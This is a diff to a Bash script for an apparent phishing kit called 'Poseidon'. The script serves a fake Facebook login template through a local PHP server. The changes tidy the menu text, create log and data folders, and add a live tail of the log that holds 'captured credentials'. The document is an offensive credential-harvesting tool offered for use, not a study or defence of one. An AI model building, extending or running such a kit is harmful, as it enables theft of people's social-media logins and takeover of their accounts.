@@ -19,8 +19,8 @@ EOF
     echo -e "\n\033[1;34mSelect a template:\033[0m"
     echo -e "\033[1;34m----------------------------------\033[0m"
     echo -e "\033[1;36m1. Facebook\033[0m"
-    echo -e "\033[1;36m2. SOON!\033[0m"
-    echo -e "\033[1;36m3. SOON!\033[0m"
+    echo -e "\033[1;36m2. Soon!\033[0m"
+    echo -e "\033[1;36m3. Soon!\033[0m"
     echo -e "\033[1;31m0. Exit\033[0m"
     echo -e "\033[1;34m----------------------------------\033[0m"
 }
@@ -35,6 +35,12 @@ check_directories() {
     if [ ! -d "templates" ]; then
         echo -e "\nTemplates directory not found! Please make sure the templates directory exists."
         exit 1
+    fi
+    if [ ! -d "logs" ]; then
+        mkdir logs
+    fi
+    if [ ! -d "data" ]; then
+        mkdir data
     fi
 }
 
@@ -55,7 +61,14 @@ start_server() {
     echo -e "Press \033[1;31mCtrl+C\033[0m to stop the server.\n"
 
     # Monitor the PHP server logs for captured credentials
-    echo -e "Monitoring captured credentials...(Keep checking FBlogs)\n"
+    if [ -f logs/$template.log ]; then
+        echo -e "Monitoring captured credentials...\n"
+        tail -f logs/$template.log
+    else
+        echo -e "Log file not found. Creating log file..."
+        touch logs/$template.log
+        echo -e "Log file created. Monitoring captured credentials...\n"
+        tail -f logs/$template.log
     fi
 }
 
@@ -75,8 +88,8 @@ while true; do
 
     case $option in
         1) template="facebook" ;;
-        2) template="SOON!" ;;
-        3) template="SOON!" ;;
+        2) template="Soon!" ;;
+        3) template="Soon!" ;;
         0) echo -e "\nExiting Poseidon. Goodbye!\n"; stop_server; exit 0 ;;
         *) echo -e "\nInvalid option! Please try again.\n"; continue ;;
     esac
